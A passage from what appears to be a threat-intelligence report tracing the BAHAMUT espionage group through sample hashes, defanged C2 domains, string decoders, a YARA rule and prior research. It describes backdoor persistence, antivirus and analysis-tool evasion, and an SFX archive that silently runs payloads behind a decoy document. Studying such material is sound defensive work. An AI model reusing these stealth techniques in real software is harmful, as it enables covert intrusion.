Indicators_\n\nBlackBerry identified a couple of different varieties of downloaders, all programmed in different\nlanguages. One of them was programmed in BAHAMUT’s much-favored Visual Basic 6. While VB6\nis generally thought of as one of the most simplistic languages in which to program, it is also one\nof the most time consuming to fully reverse engineer. That’s because it provides the programmer\nthe option of compiling the code natively, which was exactly what BAHAMUT did. Let’s consider\none representative hash:\n\n89757d680aade313afa6a2c6274c5034e5099fa70b55782e023f0c7db23d5e9f\n\n\n-----\n\nThe sample was first served from the URL “http://optusiy[.]com/nfgdo/dachost.jpeg” and\ncommunicated to the URL “http://signtabo[.]com/shdgfhf/rhfdshf.php.” Strings were readily decoded\nfrom these samples using the function provided above.\n\nThis piece of malware was a simple downloader which checked the site for additional payloads\nto retrieve and execute. BAHAMUT then deployed backdoors and file harvesting tools that\ncommunicated with or were delivered from the above domains. The encoding method employed\nin them was slightly different but could be readily decoded with the following function:\n\n**import** **binascii**\n\n**def** decode(a_str):\nbin_str = binascii.unhexlify(a_str)\ndecoded = ''.join([chr(a_byte + (-13 **if (cnt %** 2)==1 **else** 13)) for cnt,\na_byte in enumerate(bin_str)])\n**return decoded**\n\n_Figure 25: Python snippet to decode strings_\n\nBlackBerry identified approximately 24 samples which used this particular encoding method. Slightly\nmore than a dozen of those used a protocol similar to previous BAHAMUT samples and directly\ncommunicated to BAHAMUT-controlled domains, many of which contained various randomly named\nweb paths and PHP pages:\n\n- http://airfitgym[.]com/ldfjfew/pfhee.php\n\n- http://airfitgym[.]com/wgdejwqefyhek3db/wwurd7edg63hujbsdj.php\n\n- http://citrusquad[.]com/bhdsgfj/hegfd.php\n\n- http://citrusquad[.]com/effgubojkbf/pjkdfhjferfrds.php\n\n- http://citrusquad[.]com/oewfugjfae/tdsbhmfvtehg.php\n\n- http://citrusquad[.]com/ohdfgfe/ddshfhd.php\n\n- http://citrusquad[.]com/udfdjdfffw/hftsdhfhnkrn.php\n\n- http://citrusquad[.]com/usefjdfws/hesgfjghbf.php\n\n- http://citrusquad[.]com/xrsadgh/whfsoprtw.php\n\n- http://regditogo[.]com/isgdhbdfs/dfdsfjkfgcsd.php\n\n- http://regditogo[.]com/xejdfsfe/kgsghxuy.php\n\n- http://regditogo[.]com/ytydfhbvfy/ugfbfdjna.php\n\n- http://signtabo[.]com/ksahdugevfdjevshbsyavyvwe/xjgfysebdsfredg.php\n\n- http://tierradom[.]com/ljdjkfhufe/ohsdffjjdgf.php\n\nBlackBerry examined one of these samples more closely, focusing on some interesting strings that\nshowed the YouTube[™] site may have been utilized for communicating with the backdoor. Initially,\nwe inferred this by strings present in the malware. Later, we confirmed it through code analysis.\nHere’s an example:\n\n08e65f09e41da3bc211a77ced8af657bde00d7a2b93d77446f29b6c8c3262ccd\n\n\n-----\n\nThe file was programmed in Visual Basic 6 and utilized six different timers to perform various tasks.\n\n**Description** **Purpose**\n\nTimer1 Created the file “C:\\Users\\AppData\\Roaming\\Microsoft\\System_log”\n\nTimer2 Downloaded and executed a payload based upon root URL http://citrusquad[.]com/\nusefjdfws and a payload name returned from Timer5\n\nTimer3 1. Collected information about the victim system including installed AV software, installed\nsoftware, computer name, username, and other basic information via WMI. This information\nwas posted to the PHP page “http://citrusquad[.]com/usefjdfws/hesgfjghbf.php” using\nseveral randomly named variables.\n2. The POST request used a unique User-Agent “nkjsdhfsdf343434fdxfd”\n3. This timer also created a file named “ugefy.dat”. The purpose of this file was unclear.\n\nTimer4 Established persistence for the backdoor by creating the LNK file “%APPDATA%\\Microsoft\\\nWindows\\Start Menu\\Programs\\Startup\\wickpot.lnk”\n\nTimer5 Communicated with “citrusquad[.]com” to a custom URL. It split the returned data using the\nstring “%~%”. If the preceding string was “flop” it would initiate Timer2 and download and\nexecute a new payload. Otherwise it would initiate Timer6.\n\nTimer6 Verified network connectivity by using the command “ping -n 2 -w 300” to send two ping\nrequests to “google.com”. If the ping requests came back successfully it initiated Timer3.\n\n_Table 6: Details of a recent VB6 BAHAMUT backdoor_\n\nThere was additional functionality to determine if someone was attempting to analyze the backdoor\nthat was associated with Timer3. This caught BlackBerry’s attention because its purpose appeared\nto be to simply alert BAHAMUT to the fact that an analyst was trying to examine one of its files.\nBlackBerry even observed evidence of BAHAMUT reacting to such notice and subsequently changing\ntack. The backdoor attempted to determine whether any of the following process names were active\non the victim system via CreateToolhelp32Snapshot:\n\n- hexeditor\n\n- hworks\n\n- ida\n\n- ollydbg\n\n- pexplorer\n\n- windbg\n\n- wireshark\n\nNote that all the names above reference tools commonly used in forensic or malware analysis. If\none of the process names was identified, the malware would communicate those details back to\nthe C2 encoded within the URL parameters passed to the PHP page.\n\nBlackBerry discerned the presence of several encoded strings within the backdoors that invoked\nYouTube functions, including finding and watching specific videos:\n\nhttp://www.youtube[.]com/get_video.php?video_id=; and http://www.youtube[.]\ncom/watch?v=\n\n\n-----\n\nAfter thorough analysis, BlackBerry was unable to confirm if YouTube was used for any C2 function.\nInstead, it appeared more likely that the backdoors could be instructed to view certain videos to\nartificially inflate view counts. BlackBerry assesses with medium confidence that the YouTube\nfunctions of recent BAHAMUT samples may have been designed to legitimize the “fake” assets\nthey also cultivated and deployed. BlackBerry had not found any YouTube videos involved in this\nscheme at the time of writing.\n\n\n-----\n\n### Attribution\n\n###### Connecting the Dots – A Serpentine Tale of Attribution\n\nAt the onset of this research project, BlackBerry had a solid grasp of BAHAMUT’s existing\ninfrastructure across different operational domains: Android, iOS, credential harvesting, etc. We\nthen set out to connect the currently observable infrastructure to that named in the previous,\nhistorical research surrounding the group. Our hope was to tie what appeared to be a bunch of\nloosely connected findings together in a way that could be readily grasped and fact-checked by\nthe wider security community. Along the journey, BlackBerry hoped to succeed in tightening the\nattribution of this group. After an exhaustive review, BlackBerry estimates that Collin Anderson and\nClaudi Guarnieri proposed the most plausible attribution theory to date, i.e. that BAHAMUT is likely\na mercenary group offering hack-for-hire services to a wide range of clients.\n\n###### Kaspersky’s “InPage” — Access to Zero-Day Exploits\n\nWe began with some of the earliest research that could be directly connected to BAHAMUT:\nKaspersky’s 2016 InPage vulnerability research (Legezo, 2016). In their write-up, Kaspersky revealed\nthat an unnamed group was using a zero-day exploit that took advantage of a vulnerability in a word\nprocessor called InPage. InPage is popular in Urdu, Persian, and Arabic speaking countries. The\ntargets of the vulnerability were noteworthy because the software company listed most of the major\nnewspapers in both India and Pakistan among its users (http://www.inpage.com/Home/Users).\n\n\n-----\n\n_Figure 26: Screenshot of news organizations using the InPage word processing software as reflected on the InPage website_\n_in August 2020_\n\nDespite the significance of their findings, Kaspersky did not attribute the attack to any group. As\ndiscussed below, BlackBerry was able to directly link two samples mentioned in the InPage write-up\nto some of the most recent BAHAMUT Windows samples we identified separately.\n\nIn their report, Kaspersky disclosed that the vulnerability they identified was eventually assigned\nthe designation “CVE-2017-12824” even though they appeared to have reported it to the vendor and\nCERT-IN sometime in the latter half of 2016 (Legezo, 2016). Initially, BlackBerry was only able to\ntrace this exploit to June 1, 2016 based upon the following sample listed in Kaspersky’s write-up:\n\n9bf55fcf0a25a2f7f6d03e7ba6123d5a31c3e6c1196efae453a74d6fff9d43bb\n\nHowever, BlackBerry noticed an intriguing response to the research in the comment section of the\nwebpage left there by a user calling him/herself “engineer,” who suggested the exploit had been\nused even earlier in time. This turned out to be a decisive clue, one BlackBerry pursued further.\n\n\n-----\n\n_Figure 27: Comment posted by “engineer” on Kaspersky’s InPage blog_\n\nBy leveraging QiAnXian’s deeper analysis of the InPage exploit published two years later (奇安信威\n胁情报中心, 2018), BlackBerry learned that the last modification time of the “InPage100” stream in\nthe samples they documented was December 17, 2009 09:47AM. The researchers at QiAnXian did\nnot adjust for the time zone of their analysis machine, and the true UTC datetime was “12/17/09\n1:47:53 AM”. This timestamp could very well have indicated the actual development date, although\nthe researchers did not state as much. A simple command to convert Microsoft timestamps to a\nhuman readable date is: “w32tm.exe /ntte {decimal datetime}”, where the decimal datetime is the\ndecimal value of the hex timestamp in this case “0x01CA7EBAF2A7F1F0”.\n\nTimestamps are easily changed, and are often modified to thwart analysis. We wanted to see\nwhether any other documents could be found with the timestamp unchanged. BlackBerry developed\na simple YARA signature to identify InPage documents with the same time/date stamp:\n\n\n###### rule inPage_exploit_timestamp { strings: $dt = {F0 F1 A7 F2 BA 7E CA 01} $inp = {49 00 6E 00 50 00 61 00 67 00 65 00 31 00 30 00 30} condition: $dt and $inp }\n\n\n_Figure 28: YARA rule to identify timestamped InPage documents_\n\nUsing the rule above, BlackBerry confirmed the hypothesis by locating the sample:\n“f1fa2da3ad8ec31e16e560eb716c9e83a797bf870ab84ec147489a15894da1d2”. This sample\nestablished that the InPage exploit went even further back than first posited by “engineer”, who\nsuggested it dated to circa 2014. The file referenced above was first submitted to a commonly used\nmalware repository on March 18, 2010. This confirmed that the zero-day was used for at least six\nyears prior to being discovered by Kaspersky. In the context of the information security community,\nthat is an extremely long time.\n\nWith that startling revelation in hand, BlackBerry considered why it took so long to find. One\npossibility is that it was used only in highly targeted instances and the victims noticed no discernable\neffects to their systems. An extremely limited scope in targeting would prevent the samples from\nbeing discovered and analyzed. Another possibility is that more than one actor including BAHAMUT\nmay have discovered, co-opted, and utilized the exploit before it was ultimately discovered by\nKaspersky. BlackBerry decided to explore this a bit more.\n\n\n-----\n\n**A Slight Detour on the Silk Road**\n\nBlackBerry took a deeper look at the “f1fa…” sample. To begin with, we noticed the marker of the first\nsignificant piece of shellcode was “Y!ngY!ng”. Instead of using a download-and-execute shellcode,\nas was typical in many of the later exploits, the document carried its own embedded and encoded\npayload. The payload was extracted from the document by carving, starting at offset 0x2800 with\na size of 0x6400. The payload was encoded using a simple ROR against 0x1 followed by an XOR\nagainst the byte 0xEC. Once extracted this executable had the following hash:\n\n- e67404fe5863f92cabc51e842683a2c02eb1f6707fb6ddfddaf847aa1eaca643\n\nThis binary payload contained yet another encoded payload within it beginning at file offset 0x3630.\nThe binary would have to be launched with administrative privileges from the exploit because it\nattempted to read the first 0x400 bytes of the C: drive. The binary used the first value it read in as\nan XOR key to decode more shellcode within itself. If the C: drive was not bootable on the hard\ndrive this payload would likely fail to function properly. But, if the C: drive was the first partition on\ndisk and bootable, the byte “0xEB” would be used as the XOR key.\n\n**What Is Dead May Never Die**\n\nThe first stage of shellcode then decrypted a second stage using the XTEA algorithm. This final stage\nof shellcode communicated with the domain “leelee.dnset[.]com” and appeared to spawn a popular\nChinese RAT that hasn’t died off despite being known to the security community for many years:\nPoisonIvy. Based upon crossover with the IP address 63.251.21[.]135 and similarities in malware, this\nparticular sample was easily linked to the targeting a group in diaspora perceived to be a potential\nthreat to the power of the Chinese Communist Party. Specifically, the domain “uyghuri.51vip[.]biz”\ncan be linked via a shared IP address “68.68.47[.]153” to a handful of targeted attacks and other\nrelated dynamic DNS domains that spanned the time period from early 2010 into mid 2016:\n\nuygur.eicp[.]net uyghurie.51vip[.]biz uygur.51vip[.]biz\n\nuygur.xicp[.]net uygur.5166[.]info\n\nThe domain “leelee.dnset[.]com” was even explicitly associated with a human-rights NGO\nrepresenting a minority living in China within an academic paper presented at the USENIX Conference\nin 2014 (Le Blond, et al., 2014).\n\nLater, BlackBerry identified a second early InPage document that leveraged the same exploit:\n\n99e274c1bc0b12f2d7b0bdf36ae515af8ba3bbb1d788806ddb7908f239bff985\n\nThis document was submitted to a commonly used malware repository in March of 2011.\nIt used the same shellcode marker as described above and also contained an embedded\npayload, although it was encoded this time with a ROR 0x1 and XOR with 0xB1. The decoded\npayload, “fb4e97bdffe2ad617cd42d5ef5e9bed60b9422db3375acd91b043b33b71776e3” carried a\nfunctionally similar PoisonIvy sample within its resource section. The final payload used a different\nXTEA key and communicated to the domains “kannat.ns01[.]us” and “aspnet.dyndns[.]info”.\n\nBlackBerry took another brief detour to go search for the aforementioned shellcode marker found\nin the 2009 document: “Y!ngY!ng”. BlackBerry identified three additional InPage exploit documents\nwith this seemingly unique marker:\n\n\n-----\n\n013417bd5465d6362cd43c70015c7a74a1b8979785b842b7cfa543cb85985852\n\na7a746881aed3442af5f2568632ecc2c9a20dc40887287791a0911d5943903a4\n\nb32faeb66cffd6a380b6b0094918a21e44357b85f91029030e956a24bed67f5c\n\nThe binary beginning “01341” was mentioned in a Microsoft blog in late 2018 (Office 365 Threat\nResearch Team, 2018). BlackBerry tracks the payload described in that research as associated\nwith yet another Chinese threat actor described publicly as BANECHANT or MM-CORE. All of this\nsuggests that Chinese authors were likely the first to find and exploit the InPage vulnerability inthe-wild in pursuit of surveilling a particular population of interest.\n\nAfter careful consideration, BlackBerry assesses with high confidence that BAHAMUT likely found\nand co-opted the InPage exploit in-the-wild, as it retained the same exact timestamp found in\nthe earlier Chinese developed exploit documents. While it would be trivial to modify timestamps\nto impede analysis and attackers usually do this, all of the InPage exploits BlackBerry identified\ncontained this same, unmodified timestamp. The failure to change this one, seemingly small detail\nproved to be highly unique and enormously consequential. From the attacker perspective, this was\na game-changing oversight, one that ultimately contributed to our high confidence assessment.\nThese findings should additionally give readers pause to question previous community findings\nabout how all the things are “connected” through the use of CVE-2017-12824.\n\n**Tenuous Connections**\n\nBlackBerry assesses that the continued use of CVE-2017-12824 is an unreliable indicator to\nconnect attack groups to one another following Kaspersky’s 2016 publication. This is especially\ntrue considering the high likelihood that BAHAMUT co-opted the exploit from its original Chinese\nauthors. Other threat groups with an interest in Urdu speaking countries could do exactly the same.\nBAHAMUT’s documented propensity for mimicking other groups’ methods also casts some doubt\non Trend Micro’s connection to CONFUCIUS based on the identical use of the filename “winopen.\nexe”. This postulate becomes even more poignant when considering that the exploit essentially\nbecame public knowledge following Kaspersky’s 2016 publication.\n\n**Kaspersky: Under the Microscope**\n\nReturning now to the Kaspersky write-up, BlackBerry took note of the fact that the InPage documents\ndescribed were used to target both “financial and governmental institutions.” Kaspersky identified\nbanks in Asia and Africa as specific targets, and they provided a screenshot showing a relevant\nphishing email from April 10, 2013:\n\n_Figure 29: Phishing email from Kaspersky’s 2016 InPage blog_\n\n\n-----\n\nCuriously, the date of this phishing email predates other time references within the text of the article\nby nearly three years. This prompted BlackBerry to examine the samples Kaspersky had listed much\nmore closely, specifically:\n\n085de1580421aefe1d581f4b6012a485e2665cee78630b6a0c311ee3bc8409b6\n\n43ffd4791798059b29170fe9b6d37cb3a18b1907c2b58a3c804973ca1d656505\n\nThe sample beginning “085” communicated directly to an IP address “91.219.238[.]246”. This IP\nwas significant because BlackBerry noted that recently developed and undisclosed BAHAMUT\nmalware samples communicated with the same exact IP address. We then identified eleven other\nsamples in total that communicated with this IP. They were all Windows malware:\n\n1305e7aea00eadecdc6fe143c0e91f93e9b6d5dc13407375e0e3dab7e5b99072\n\n20862996f0511f9a3bd1d92c690bb499a6fbb07683889cba2c2d574a34d881da\n\n541cb62c5a9583f82b89c73b47b495be2485b20d95120aab7e3552ce71fc0774\n\n7b3a0273ca92cb17656df4522779b92d43bdbee1980eb4302c949f30dae8d0fa\n\n9c03e5e4fb8774b28a56ca519e8a9de0f5704674d91bac6ffb129426b830755e\n\na2f40cf78a5f595409d5bc714abb09f62f2322a5e486687c43ef7d2b5f436f00\n\nc1330eb733712935f47a125704c11149a1e09601791bce44ccb067bf19d43bb0\n\nc2454805fa90df13253d0bf20ddaab92c1c13e04b72cf74ad0998b76d4efc67c\n\nc8cc9ac7895717e1e82ec02d2787b910eca81e906c0c1da2896fc1c0a34f6e83\n\ne48a58d0f5d5fb8aa7c96c7b47afc7a6b682078797caef53e7d353483f10e82a\n\nf816bcbb61d0bd495ea9e920c52825b020bd38dbc4f42c05f955ed34f7207ac3\n\nIt’s not entirely clear why BAHAMUT would use this particular IP address for more than four\nyears. It was highly unlike them to do so. BlackBerry speculates that this address was likely a\ncomponent of BAHAMUT’s C2 infrastructure, only used in secondary or tertiary payloads. Directto-IP communication in BAHAMUT-related malware is relatively uncommon. Taking advantage of\nthe discovery of IP crossover between recent BAHAMUT malware C2 and malware described in the\nKasperksy write-up, BlackBerry linked three other recent samples conclusively as being delivered\nfrom the following URLs. Note that they are also included in the block of hashes above:\n\n\n**SHA256 Hash** **URL** **FirstSeen**\n\n|1305e7a… 541cb62… a2f40cf…|http://poiusavid[.]com/dvdi/igxtray.exe http://medieczema[.]com/subsr/winlogn.exe http://optusiy[.]com/ostpa/spoolvs.exe|August 3, 2019 February 12, 2020 January 31, 2020|\n|---|---|---|\n\n\n_Table 7: Recently delivered Windows malware samples_\n\nBlackBerry pinpointed another dozen URLs by investigating the domains above. Analysis of\nthese samples expanded our understanding of other current and recently lapsed Windows C2\ninfrastructure. BlackBerry located more samples based on unique strings and code similarities\npresent in these binaries. As discussed, these recent Windows samples all used a rather unique\ntrick, wielding Intel 8087 floating point calculations to perform sensitive string decoding with use\nof a position-based cipher.\n\n\n-----\n\n**Cisco Talos — Another Link in the Chain**\n\nThe hash beginning “43ff” in the Kaspersky write-up provided another useful link in BlackBerry’s\nanalysis. While the majority of the group’s backdoors were programmed in Delphi or Visual Basic,\nthis particular sample was programmed in C++. Upon deeper inspection, we found the binary’s\nprimary function was to log keystroke data and communicate it back periodically to the domain\n“leastinfo[.]com”. Strings in the binary were encoded using one of two different position-based\naddition-subtraction routines:\n\n\n**def** decode(s):\nout = ''\ncount = 1\n**for c in s:**\n**if count ==** 1:\nnew = ord(c) + 2\n**elif count ==** 2:\nnew = ord(c) + 1\n**elif count ==** 3:\ncount = 0\nnew = ord(c) -1\ncount+=1\nout+=chr(new)\n**return out**\n\n**def** decode2(s):\nout = ''\ncount = 1\n**for c in s:**\n**if count ==** 1:\nnew = (ord(c) + 0xFE) & 0xFF\n**elif count ==** 2:\nnew = ord(c) - 1\n**elif count ==** 3:\ncount = 0\nnew = ord(c) + 1\ncount+=1\nout+=chr(new)\n**return out**\n\n\n_Figure 30: Python snippets to decode strings in sample 433f…_\n\nBy employing some rudimentary code matching techniques, BlackBerry located several additional\nsamples including the following:\n\n8e858381add55cc83390fc323856cb5da5295f2e82f8e66cbfb943e1e2df2af8\n\neb1ff2f9639c33deb1d1db234f42d19add9cfcb8a5d8c8776a052600368622e2\n\nBoth samples communicated to the domain “techwach[.]com”.\n\n\n-----\n\nThis particular domain was explicitly mentioned in Cisco Talos’s second MDM writeup (Mercer,\nRascagneres, & Williams, Advanced Mobile Malware Campaign in India uses Malicious MDM — Part\n2, 2018). According to Talos, this particular domain resolved to an IP address that directly overlapped\nwith their unnamed threat actor’s mobile device management scheme in May of 2018. In their first\n“Malicious MDM” article, Talos identified malicious iOS applications which communicated directly\nto the same domain. Although they did not state what that IP address was, BlackBerry determined\nit was almost surely “217.147.168[.]29” based upon historical passive DNS information.\n\nAll of the above led BlackBerry to assesses with high confidence that the activity described by\nCisco Talos was performed by the same group that employed the InPage exploit in Kaspersky’s\nwrite-up: BAHAMUT.\n\nNext, using other code-based similarities and unique string-based similarities, BlackBerry was able\nto directly tie BAHAMUT’s more recent Windows backdoors to Trend Micro’s URPAGE. Much like\nthe shellcode in some of the group’s more sophisticated exploits, BAHAMUT’s malware attempted\nto identify and evade a number of antivirus products and other security solutions simultaneously.\nThe binaries stored these particularly sensitive strings in a common fashion: “@t@s@a@v@a@”.\nReaders will recognize that the string contained the word “avast” (a popular antivirus product) in\nreverse, with each character separated by the @ symbol. The following list of strings representing 15\ndifferent antivirus and security products was observed in more than 40 different samples deployed\nthroughout 2017 and 2018:\n\nAvast f-secure Quickheal\n\nAvg kaspersky Sophos\n\navira mcafee symantec\n\nbitdefen microsoftsecur trendmicro\n\ncomodointer norton vba32\n\nBlackBerry found the following hash in the Appendix of both the Cisco Talos “Malicious MDM 2”\nresearch as well as in Trend Micro’s URPAGE research, further establishing the direct BAHAMUT\nrelationship between them:\n\n6f362bc439ce09c7dcb0ac5cce84b81914b9dd1e9969cae8b570ade3af1cea3d\n\nQuick Heal caught our attention in the list above, because it is deployed predominantly in India,\nwhereas the rest of the products enjoy a wider global adoption rate.\n\n###### DarkMatter — Shifting in the Winds\n\nFollowing former DarkMatter researcher Taha Karim’s presentation on a group he named WINDSHIFT\n(Karim, 2018), there was a lot of speculation in the security community about exactly who or what\nthe group was. Several write-ups appeared in the following months concerning WINDSHIFT including\nby Palo Alto (McCabe, 2019) and Objective-See (Wardle, 2018). Both of these reports included a\ndeeper analysis of the MacOS payloads deployed by the group and provided some additional linked\ndomains including “string2me[.]com” and “domforworld[.]com”.\n\n\n-----\n\nKarim stated that the group employed “DES with a hardcoded Key and IV [initialization vector]” and\nthe common crypto library function CCCrypt in their MacOS samples. This fact directly aligned\nwith what Cisco Talos’ findings about the iOS samples from their follow-on MDM write-up. While\nBlackBerry lacked access to the iOS samples Cisco analyzed, they included enough information\nto replicate their work when cross-referenced with the initialization vector that was included in\nKarim’s Objective-C code slide. With a bit of experimentation BlackBerry confirmed that both sets of\nsamples used the same initialization vector (IV), “0x0102030405060708”, although they appeared\nto use differing encryption keys. The initialization vector isn’t unique, but it’s more common to see\nand initialization vector with all zeroes, or else completely random values. As such, the choice of\nthis particular sequence of numbers in the IV is indicative of style.\n\nIn reading Cisco Talos’ work, BlackBerry found they had built a script for decryption, but didn’t share\nthe code for it, as can be seen below:\n\n_Figure 31: Cisco Talos demonstrating a decryption script_\n\nBlackBerry constructed the following Python snippet that fulfilled the same purpose.\n\n\n**from** **Crypto.Cipher** **import DES**\n**import** **base64,** **binascii**\n\nBS = 16\npad = **lambda s: s + (BS -** len(s) % BS) * chr(BS - len(s) % BS)\nunpad = **lambda s : s[0:-ord(s[-1])]**\n\n**def** des_decrypt(s):\ns = base64.b64decode(s)\nkey = b'&%^*#@!$'\niv = binascii.unhexlify('0102030405060708')\ndes = DES.new(key, DES.MODE_CBC, iv)\n**return unpad(des.decrypt(s).decode('utf-8'))**\n\n\n_Figure 32: Python snippet to decrypt DES strings from Cisco Talos’ blog_\n\nIn his first talk about WINDSHIFT, Karim provided a single C2 domain, “flux2key[.]com”, and stated\nthat DarkMatter discovered a Windows sample in May of 2018 that communicated with the same\ndomain as the MacOS malware. The hash of this sample was not shared at the time, but BlackBerry\nmanaged to find the following Windows executable which beaconed to the same domain exactly\nas Karim described:\n\n65194c18571f36e45349d0b57d5b1714d1b2846da38a6f4ab0585371691f7705\n\n\n-----\n\nBased upon what was presented in his slides, Karim instrumented the decoding of the strings using\nthe Unicorn emulator. BlackBerry found that the Python functions listed above could be readily used\nto decode the majority of strings in this particular file. This discovery, along with significant, unique\ncode similarities, provided a direct, high confidence link back to Kaspersky’s InPage writeup, Cisco’s\nMDM findings, and Trend Micro’s URPAGE discoveries. BlackBerry assesses with high confidence\nthat WINDSHIFT and BAHAMUT are the same group. In sum, we are now able to assess with\nconfidence that BAHAMUT has successfully developed and deployed malware for Android, iOS,\nMacOS, and Windows.\n\n###### The Bellingcat Correlation\n\nIn 2017, Collin Anderson and Claudio Guarnieri, writing for Bellingcat, produced some of the most\ncompelling work on the threat group in two separate blog posts (Anderson, Bahamut Revisited,\nMore Cyber Espionage in the Middle East and South Asia, 2017) (Anderson & Guarnieri, Bahamut,\nPursuing a Cyber Espionage Actor in the Middle East, 2017). In their work, Anderson and Guarnieri\nreferenced three Android samples:\n\nd7fb80c71fc6d50ce44036a3116c3ae7e1b5800fca45f2876854ed7f5220d45c\n\n0a721dc82ec7eb9c20c44dbcac047879b8d15d54b3a186aaf8079058b10b30c9\n\n73f2c81473720629be32695800b7ad83494f2084\n\nBlackBerry was unable to obtain a copy of the last hash. However, we were able to confirm their\nanalysis concerning the other two:\n\n\n**Initialization Vector** **Encryption Key** **Encryption Cipher**\n\n\nyqiYrerlI943UqCb QzxWgYtvujuYTFGn AES/CBC/NoPadding\n\n\nN/A Huisgte87Hdy4Oli AES/ECB/PKCS5Padding\n\n\nThe translation application beginning “d7fb80…” was later referenced directly by Trend Micro in their\nURPAGE writeup. The encryption key “Huisgte87Hdy4Oli” was used in at least two other BAHAMUTrelated Android applications also documented by Trend Micro:\n\n0d349d085c81fde9febc3b67d615ff35b6823d1742f6039aff4f2b8a68f06bfb\n\nf25965abef6abbdd9b7c8477f66d599dac346658fff67a728df66efcc74757e9\n\nIn their second write-up, Anderson and Guarnieri directly referenced four more Android samples:\n\n05a4e1e6542d6b0ba7b6eced12c05e96a341deaf88adb28695365544940da5ed\n\n090bc0f5936a12771b7fdf15070ba2169a24108a095e939920498b94ce19596d\n\n65398e0f12248ca71642216ff8606744305c2397c368ff072c243e6410fd42bc\n\n6f60dfbd3c3fdffc731969acc1b7a82a545b8ec5baaecd48e7ae8055beb37259\n\n\n-----\n\n_Table 8: Encryption methods, keys, and initialization vectors used in the Android malware Bellingcat provided_\n\nAnderson and Guarnieri likely linked several of these samples together based upon the common\ninitialization vectors and encryption keys they employed. The initialization vector “yqiYrerlI943UqCb”\nwas directly associated with the following Android samples from Trend Micro’s URPAGE whitepaper:\n\n1f4e21ff4a494ff94ba33fc834ade01815e91d86bb6a9eeaf75fd060c2fbc295\n\n49aaed9dec956d345610cc724c0d1fae52ca319b8635f96bfc49ae0421ccfbaa\n\n974c182fb9872a4d108109ef84d86333fabe585b604217a72fcd7c84cd4b95a4\n\na5a818af5c88e3a87da7632c8faee1aa52685bd4a306ebdaa4e59a71f2dca80d\n\nNote that Trend Micro mistakenly called this particular string the “Encryption Key” in their Appendix\ninstead of the “Initialization Vector.”\n\n###### Bellingcat — Extra Credit Time\n\nIn the follow-up BAHAMUT research published by Bellingcat, Anderson and Guarnieri noted, “We\nhave not fully explored the extent of Bahamut’s operations, such as its Windows malware agent\nor possible other Android malware” (Anderson, Bahamut Revisited, More Cyber Espionage in the\nMiddle East and South Asia, 2017). BlackBerry undertook the task.\n\nIn a departure from past development preferences observed by BlackBerry, BAHAMUT programmed\nthe following Windows malware entirely in C#:\n\nd0e2e7fe3fab992a670137d0693a2b76a5ac88283011b4aa8786d439b37c877b\n\nStrings within the program were base64 encoded and encrypted using AES in CBC mode with a\nkey that was derived from the SHA256 hash of the string “mysec”. The final key was derived using\nMicrosoft’s implementation of “PBKDF2” which was provided via the function “Rfc2898DeriveBytes”.\nBlackBerry spent some time reimplementing the code in Python3, for wider reuse within the security\ncommunity:\n\n\n-----\n\n**import** **binascii,** **hashlib,** **base64**\n**from** **cryptography.hazmat.backends** **import default_backend**\n**from** **cryptography.hazmat.primitives** **import hashes**\n**from** **cryptography.hazmat.primitives.kdf.pbkdf2** **import PBKDF2HMAC**\n**from** **cryptography.hazmat.primitives.ciphers** **import Cipher, algorithms, modes**\n```\n BS = 16\n\n```\n`pad =` **lambda s: s + (BS -** `len(s) % BS) *` `chr(BS -` `len(s) % BS)`\n`unpad =` **lambda s : s[0:-ord(s[-1])]**\n\n**def** `decrypt(s):`\n```\n      password = hashlib.sha256(\"mysec\".encode('utf-8')).digest()\n      kdf = PBKDF2HMAC(\n          algorithm=hashes.SHA1(),\n          length=80,\n          salt = binascii.unhexlify('0201070306040805'),\n          iterations=1000,\n          backend=default_backend())\n      derived_key = kdf.derive(password)\n      key = derived_key[0:32]\n      iv = derived_key[32:48]\n      s = base64.b64decode(s)\n      cipher = Cipher(algorithms.AES(key), modes.CBC(iv),\n default_backend()).decryptor()\n      dec = cipher.update(s) + cipher.finalize()\n\n```\n**return unpad(dec.decode('utf-8'))**\n\n_Figure 33: Python snippet to decrypt strings from the .NET binary beginning d02e…_\n\nThe only interesting tidbit gleaned from the encrypted strings was the name of the LNK file that\nwould be created in the victim’s Startup directory, “Yrtss Linker.lnk”.\n\nBeyond that, the sample was a simple downloader. It would first communicate some information\nabout the victim machine, such as username and computer name. Following this first beacon it\nwould then periodically query a particular URL. If the response received was greater than 4KB it\nwould be downloaded, written to the file “%ApplicationData%/p/SmartHelp.exe”, and executed.\n\nThis particular deployment strategy strongly suggested one of two possibilities: either “SmartHelp.\nexe” had its own persistence mechanism built-in and was likely a secondary payload – or the\nmalware author did not have a firm grasp of the in-memory execution capabilities of arbitrary\npayloads in C#. BlackBerry identified a handful of other BAHAMUT C# samples, but this did not\nappear to be the group’s preferred programming language.\n\n**Extra Credit — Continued**\n\nBlackBerry examined one of the other two Windows payloads Bellingcat mentioned:\n\n1518badcb2717e6b0fa9bdd883d5ff61fedddf7ddf22cc3dc04a38f4e137fc96\n\n\n-----\n\n“1518” was a zip file downloaded from the URL (from 2016), “http://online-tracking-status.hymnfork[.]\ncom/Authority/E-Challan.zip”. It contained a binary payload within the archive that used a Microsoft\nWord icon that was clearly designed to trick a user into clicking on it:\n\n933fb101747796a2f3b57db91047fd90867f8d1c3a7cf1d8149f0c83b1467f74\n\nThe above hash was named:\n\n“E_challan_and_pending_challan_status_along_with_guidelines_as_per_required_.doc_.SCR”\n\nThe extension “.scr” was originally reserved for Windows screensavers. But renaming any “.exe”\nfile to end with “.scr” will retain its ability to execute via Windows Explorer. If the target had not\nexplicitly opted to view all file extensions for known file types, this file would have appeared to be\na document with the appropriate matching icon. The file itself was a self-extracting RAR archive\n(SFX). The archive contained the following SFX script commands:\n\n_Path=%userprofile%_\n\n_Setup=dsexplrob.exe_\n\n_Setup=“msvsmuns.exe”_\n\n_Setup=“E-Challan.doc”_\n\n_Silent=1_\n\n_Overwrite=2_\n\nThese commands would overwrite three files without prompting to the %userprofile% directory with\nthe specified names and silently execute them. Upon execution, the victim would have seen only\nthe decoy document open on the screen and be unaware that two other files had executed silently\nin the background:\n\nmsvsmuns.exe - d92037764fbd8a2dab9577b43e9a007af77859e38b67175fec6b\n\n7484efccea28\n\ndsexplrob.exe - 1be9579507a8b20110b740c65f1b65d920c455ab1c026cadb1a25\n\n0a267c206be\n\nThe binary beginning “1be” communicated to the following URL:\n\n“http://i3mode[.]com/dbExpressversion/db87987Administrator.php”\n\n…while the binary “d92” communicated to the URL:\n\nhttp://by4mode[.]com/rsdgbukhifndfjdn/gfvbjkjfvhbdfdn.php”\n\nBoth domains “i3mode[.]com” and 